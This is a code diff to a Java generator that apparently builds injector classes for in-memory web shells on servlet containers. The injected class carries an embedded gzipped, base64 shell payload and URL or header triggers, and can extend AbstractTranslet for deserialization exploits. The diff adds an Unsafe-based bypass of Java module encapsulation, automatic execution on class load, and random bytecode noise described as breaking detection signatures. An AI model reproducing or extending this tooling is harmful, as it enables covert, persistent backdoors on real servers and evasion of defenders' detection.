@@ -4,7 +4,6 @@ import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtConstructor;
-import javassist.CtField;
 import javassist.CtMethod;
 import javassist.CtNewMethod;
 import org.leo.core.util.asm.ClassFileMinimizer;
@@ -33,7 +32,12 @@ public class InjectorGenerator {
                 workspace.getShellClassName(),
                 workspace.getShellClassBytes(),
                 request.getUrlPattern(),
-                request.getEffectiveServletNamespace()),
+                request.getHeaderName(),
+                request.getHeaderValue(),
+                request.getEffectiveServletNamespace(),
+                request.isBypassJavaModuleEffective(),
+                request.isStaticInitialize(),
+                request.isShrink()),
                 plan.getInjectorDescriptor().getInjectorTemplateName());
     }
 
@@ -65,49 +69,84 @@ public class InjectorGenerator {
             ctClass.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
         }
 
-        // 写入模板静态字段（字段存在则替换，不存在则添加，便于后续扩展更多模板）
-        replaceStaticField(ctClass, "shellClassName",
-                "private static String shellClassName = \"" + escapeForJavaString(context.shellClassName) + "\";");
-        replaceStaticField(ctClass, "shellClass",
-                "private static String shellClass = \"" + escapeForJavaString(Base64Utils.gzipAndBase64(context.shellClassBytes)) + "\";");
-        replaceStaticField(ctClass, "urlPattern",
-                "private static String urlPattern = \"" + escapeForJavaString(context.urlPattern) + "\";");
+        // 写入所有注入器都需要的静态字段。
+        JavassistUtil.replaceStaticField(ctClass, "shellClassName",
+                "private static String shellClassName = \"" + JavassistUtil.escapeJavaString(context.shellClassName) + "\";");
+        JavassistUtil.replaceStaticField(ctClass, "shellClass",
+                "private static String shellClass = \"" + JavassistUtil.escapeJavaString(Base64Utils.gzipAndBase64(context.shellClassBytes)) + "\";");
+        // Listener、Valve、Interceptor、Customizer 等全局挂载点没有 URL 字段。
+        JavassistUtil.replaceStaticFieldIfDeclared(ctClass, "urlPattern",
+                "private static String urlPattern = \"" + JavassistUtil.escapeJavaString(context.urlPattern) + "\";");
+        JavassistUtil.replaceStaticFieldIfDeclared(ctClass, "headerName",
+                "private static String headerName = \"" + JavassistUtil.escapeJavaString(context.headerName) + "\";");
+        JavassistUtil.replaceStaticFieldIfDeclared(ctClass, "headerValue",
+                "private static String headerValue = \"" + JavassistUtil.escapeJavaString(context.headerValue) + "\";");
 
         JavassistUtil.applyServletNamespace(ctClass, context.servletNamespace);
 
-        // B1: 注入字节码噪声，增加注入器类字节码多样性，打破固定结构特征
+        if (context.bypassJavaModule) {
+            injectJavaModuleBypass(ctClass);
+        }
+
+        if (context.staticInitialize) {
+            injectStaticSelfInitialization(ctClass);
+        }
+
+        // 注入字节码噪声，增加注入器类字节码多样性，打破固定结构特征。
         injectBytecodeNoise(ctClass);
 
         try {
             byte[] bytes = ctClass.toBytecode();
-            return ClassFileMinimizer.transform(bytes);
+            return context.shrink
+                    ? ClassFileMinimizer.transform(bytes)
+                    : bytes;
         } finally {
             ctClass.detach();
         }
     }
 
-    private void replaceStaticField(CtClass ctClass, String fieldName, String newFieldSrc) throws Exception {
-        try {
-            CtField oldField = ctClass.getDeclaredField(fieldName);
-            ctClass.removeField(oldField);
-        } catch (Exception ignored) {
+    /**
+     * 将 Injector 所属 Module 调整到 java.base 的开放模块，使 JDK 9+ 上的
+     * 反射式 ClassLoader#defineClass 与容器私有字段访问可在强封装运行时继续执行。
+     */
+    private void injectJavaModuleBypass(CtClass ctClass) throws Exception {
+        final String methodName = "bypassJavaModule";
+        CtMethod method = CtNewMethod.make(
+                "private static void " + methodName + "(Class target){"
+                        + "try{"
+                        + "Class uc=Class.forName(\"sun.misc.Unsafe\");"
+                        + "java.lang.reflect.Field uf=uc.getDeclaredField(\"theUnsafe\");"
+                        + "uf.setAccessible(true);"
+                        + "Object u=uf.get(null);"
+                        + "Object m=Class.class.getMethod(\"getModule\",new Class[0])"
+                        + ".invoke(Object.class,new Object[0]);"
+                        + "java.lang.reflect.Method of=u.getClass().getMethod("
+                        + "\"objectFieldOffset\",new Class[]{java.lang.reflect.Field.class});"
+                        + "Long o=(Long)of.invoke(u,new Object[]{Class.class.getDeclaredField(\"module\")});"
+                        + "java.lang.reflect.Method gs=u.getClass().getMethod("
+                        + "\"getAndSetObject\",new Class[]{Object.class,Long.TYPE,Object.class});"
+                        + "gs.invoke(u,new Object[]{target,o,m});"
+                        + "}catch(Throwable ignored){}"
+                        + "}",
+                ctClass);
+        ctClass.addMethod(method);
+        String call = methodName + "(" + ctClass.getName() + ".class);";
+        for (CtConstructor constructor : ctClass.getDeclaredConstructors()) {
+            constructor.insertBeforeBody(call);
         }
-        ctClass.addField(CtField.make(newFieldSrc, ctClass));
     }
 
-    private String escapeForJavaString(String str) {
-        if (str == null) {
-            return "";
+    /** 在类初始化完成前自动执行一次 Injector 无参构造器。 */
+    private void injectStaticSelfInitialization(CtClass ctClass) throws Exception {
+        CtConstructor initializer = ctClass.getClassInitializer();
+        if (initializer == null) {
+            initializer = ctClass.makeClassInitializer();
         }
-        return str
-                .replace("\\", "\\\\")
-                .replace("\"", "\\\"")
-                .replace("\r", "\\r")
-                .replace("\n", "\\n");
+        initializer.insertAfter("new " + ctClass.getName() + "();");
     }
 
     /**
-     * B1: 注入字节码噪声，增加注入器类字节码多样性。
+     * 注入字节码噪声，增加注入器类字节码多样性。
      * <p>
      * 添加随机命名的私有方法（无副作用：局部变量 + 常量运算），并在父类构造完成后调用，
      * 打破"固定字段 + 固定方法"的注入器结构特征。噪声方法被构造函数引用，
@@ -158,20 +197,35 @@ public class InjectorGenerator {
         private final String shellClassName;
         private final byte[] shellClassBytes;
         private final String urlPattern;
+        private final String headerName;
+        private final String headerValue;
         private final ServletNamespace servletNamespace;
+        private final boolean bypassJavaModule;
+        private final boolean staticInitialize;
+        private final boolean shrink;
 
         private InjectorTemplateContext(String injectorClassName,
                                         boolean abstractTranslet,
                                         String shellClassName,
                                         byte[] shellClassBytes,
                                         String urlPattern,
-                                        ServletNamespace servletNamespace) {
+                                        String headerName,
+                                        String headerValue,
+                                        ServletNamespace servletNamespace,
+                                        boolean bypassJavaModule,
+                                        boolean staticInitialize,
+                                        boolean shrink) {
             this.injectorClassName = injectorClassName;
             this.abstractTranslet = abstractTranslet;
             this.shellClassName = shellClassName;
             this.shellClassBytes = shellClassBytes;
             this.urlPattern = urlPattern;
+            this.headerName = headerName;
+            this.headerValue = headerValue;
             this.servletNamespace = servletNamespace;
+            this.bypassJavaModule = bypassJavaModule;
+            this.staticInitialize = staticInitialize;
+            this.shrink = shrink;
         }
     }
 }
